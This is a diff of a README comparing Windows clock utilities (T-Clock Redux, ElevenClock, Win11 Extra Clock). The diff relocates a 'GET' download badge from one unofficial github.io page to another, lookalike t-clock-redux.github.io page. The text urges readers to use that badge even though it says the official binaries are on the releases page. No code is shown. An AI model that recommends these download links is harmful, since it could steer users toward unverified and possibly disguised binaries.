@@ -21,6 +21,8 @@ ElevenClock, the Python neighbor, lists the same class of work:
 
 Win11 Extra Clock restores a Windows 10 style clock on Windows 11: seconds and long date in the calendar flyout, a light tray icon with an update badge, calendar detection, test mode without the calendar, nine position presets plus a custom offset, theme-aware icons, no telemetry.
 
+[![GET T-Clock Redux](https://img.shields.io/badge/GET-T%20Clock%20Redux-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://t-clock-redux.github.io/T-Clock/)
+
 Clock format UI in T-Clock is [pageformat.c](FILES/clock/pageformat.c). Alarm page is [pagealarm.c](FILES/clock/pagealarm.c). Alarm runtime is [alarm.c](FILES/clock/alarm.c). Settings store is [settings.c](FILES/clock/settings.c). Calendar is [DeskCalendar.c](FILES/clock/DeskCalendar.c).
 
 ElevenClock settings live in [settings.py](FILES/settings.py). Globals are [globals.py](FILES/globals.py). Extra Clock seconds timer is [PreciseSecondTimer.cs](FILES/services/PreciseSecondTimer.cs). Flyout UI is [FlyoutWindow.xaml](FILES/services/FlyoutWindow.xaml).
@@ -229,8 +231,6 @@ ElevenClock and Extra Clock accept coffee and GitHub sponsors. T-Clock Redux is 
 ![Grid](services/image3.png)
 
 ## Download
-
-[![GET T-Clock Redux](https://img.shields.io/badge/GET-T%20Clock%20Redux-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://gregorianudelman.github.io/.github/T-Clock)
 
 Use the GET badge for this pack. Official T-Clock Redux binaries are stable, beta, and nightly on the GitHub releases page. Pick t clock redux x64 unless you still need `_vc2010`. For t clock redux windows 11, prefer ElevenClock or Extra Clock, or patch the taskbar first. For t clock redux windows 10, T-Clock Redux is the native clock.
 
